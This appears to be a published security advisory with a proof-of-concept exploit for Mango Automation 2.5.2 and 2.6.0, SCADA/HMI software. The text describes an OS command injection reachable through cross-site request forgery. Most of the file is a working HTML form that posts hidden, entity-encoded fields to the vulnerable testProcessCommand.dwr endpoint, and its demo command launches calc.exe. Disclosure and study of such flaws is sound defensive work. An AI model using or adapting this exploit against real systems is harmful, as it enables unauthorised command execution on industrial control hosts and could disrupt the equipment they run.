@@ -1,0 +1,56 @@
+
+Mango Automation 2.6.0 CSRF Arbitrary Command Execution Exploit
+
+
+Vendor: Infinite Automation Systems Inc.
+Product web page: http://www.infiniteautomation.com/
+Affected version: 2.5.2 and 2.6.0 beta (build 327)
+
+Summary: Mango Automation is a flexible SCADA, HMI
+And Automation software application that allows you
+to view, log, graph, animate, alarm, and report on
+data from sensors, equipment, PLCs, databases, webpages,
+etc. It is easy, affordable, and open source.
+
+Desc: The POST parameter 'c0-param0' in the testProcessCommand.dwr
+method is not properly sanitised before being used to execute commands.
+This can be exploited to inject and execute arbitrary OS commands as
+well as using cross-site request forgery attacks.
+
+Tested on: Microsoft Windows 7 Professional SP1 (EN) 32/64bit
+           Microsoft Windows 7 Ultimate SP1 (EN) 32/64bit
+           Jetty(9.2.2.v20140723)
+           Java(TM) SE Runtime Environment (build 1.8.0_51-b16)
+           Java HotSpot(TM) Client VM (build 25.51-b03, mixed mode)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2015-5261
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5261.php
+
+
+20.08.2015
+
+--
+
+
+<html>
+  <body>
+    <form action="http://localhost:8080/dwr/call/plaincall/EventHandlersDwr.testProcessCommand.dwr" method="POST">
+      <input type="hidden" name="callCount" value="1" />
+      <input type="hidden" name="page" value="&#47;event&#95;handlers&#46;shtm" />
+      <input type="hidden" name="httpSessionId" value="&#13;" />
+      <input type="hidden" name="scriptSessionId" value="26D579040C1C11D2E21D1E5F321094E5866" />
+      <input type="hidden" name="c0&#45;scriptName" value="EventHandlersDwr" />
+      <input type="hidden" name="c0&#45;methodName" value="testProcessCommand" />
+      <input type="hidden" name="c0&#45;id" value="0" />
+      <input type="hidden" name="c0&#45;param0" value="string&#58;C&#58;&#92;&#92;windows&#92;&#92;system32&#92;&#92;calc&#46;exe" />
+      <input type="hidden" name="c0&#45;param1" value="string&#58;15" />
+      <input type="hidden" name="batchId" value="24" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
